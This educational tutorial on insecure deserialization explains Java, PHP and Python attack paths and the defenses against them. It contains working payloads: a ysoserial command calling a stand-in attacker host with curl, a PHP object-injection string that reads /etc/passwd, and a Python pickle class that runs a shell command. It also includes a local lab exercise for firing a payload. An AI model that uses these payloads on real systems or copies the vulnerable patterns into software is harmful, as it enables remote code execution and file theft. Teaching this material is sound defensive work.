# Insecure Deserialization

**Category:** App Security
**Date:** 2026-06-27
**Difficulty:** Intermediate

---

## What It Is

Deserialization is the process of converting structured data (JSON, XML, binary blobs) back into objects your application can use. Insecure deserialization occurs when an application deserializes attacker-controlled data without validation, allowing the attacker to manipulate object state, trigger unintended code paths, or execute arbitrary code. The danger is that many serialization libraries will invoke constructors, setters, or magic methods automatically during the deserialization process — before your application logic can inspect what arrived.

## Why It Matters

A successful exploit can lead to Remote Code Execution (RCE), privilege escalation, or denial of service — often with a single crafted HTTP request. The Apache Commons Collections vulnerability (CVE-2015-4852) allowed RCE against countless Java enterprise applications by exploiting Java's native deserialization; it remained exploitable in production systems for years.

## Practical Example

**Java native deserialization (conceptual gadget chain):**

An application accepts a serialized Java object in a cookie or POST body:

```java
// Vulnerable endpoint
ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
Object obj = ois.readObject(); // DANGER: executes gadget chains during read
```

An attacker uses `ysoserial` to generate a payload targeting a library on the classpath (e.g., Commons Collections):

```bash
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/pwned' | base64
```

The base64 blob is sent as the request body. When `readObject()` runs, the gadget chain triggers, executing the shell command — before any application-level code checks the object type.

**PHP object injection:**

```php
// Vulnerable
$data = unserialize($_COOKIE['user_prefs']);

// Attacker crafts a cookie containing:
// O:8:"UserPref":1:{s:4:"file";s:11:"/etc/passwd"}
// If UserPref has a __destruct() that reads $this->file, the file is exposed.
```

**Python pickle:**

```python
import pickle, os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('id > /tmp/pwned',))

payload = pickle.dumps(Exploit())
# Sending this payload to pickle.loads() executes the command
```

## How to Defend

- **Never deserialize untrusted data with native serialization.** Prefer data formats like JSON or Protobuf parsed by strict, schema-aware libraries that construct plain value objects rather than arbitrary class instances.
- **Allowlist acceptable classes.** If you must use Java's `ObjectInputStream`, override `resolveClass()` to reject any class not on an explicit allowlist. Libraries like `SerialKiller` do this.
- **Validate and sign serialized tokens.** Use HMAC or asymmetric signatures to detect tampering before deserialization. JWT libraries do this for tokens; apply the same principle to any serialized state.
- **Run deserialization in a sandboxed context.** Use a least-privilege process or container with no network access, limited file permissions, and seccomp filters so that even a successful gadget chain can do little damage.
- **Keep dependencies patched.** Gadget chains depend on specific library versions. Regularly update and audit your dependency tree with `mvn dependency:tree`, `pip list --outdated`, or a tool like Snyk.

## Today's Challenge

1. Spin up a local Java project that includes `commons-collections 3.1` as a dependency.
2. Download `ysoserial` and generate a payload: `java -jar ysoserial.jar CommonsCollections1 'touch /tmp/pwned'`.
3. Try to deserialize the payload with a vulnerable `ObjectInputStream`. Confirm `/tmp/pwned` appears.
4. Then fix it: implement a `LookAheadObjectInputStream` that allowlists only your own data classes and verify the same payload is now rejected.

If you don't have a Java environment handy, audit a Python codebase you own: grep for `pickle.loads(` or `yaml.load(` (without `Loader=yaml.SafeLoader`) and note every call site that touches external data.

## Key Takeaway

Deserializing attacker-supplied data with native serialization libraries is handing an attacker a loaded weapon — the "parse" step itself can execute arbitrary code before your business logic ever runs.
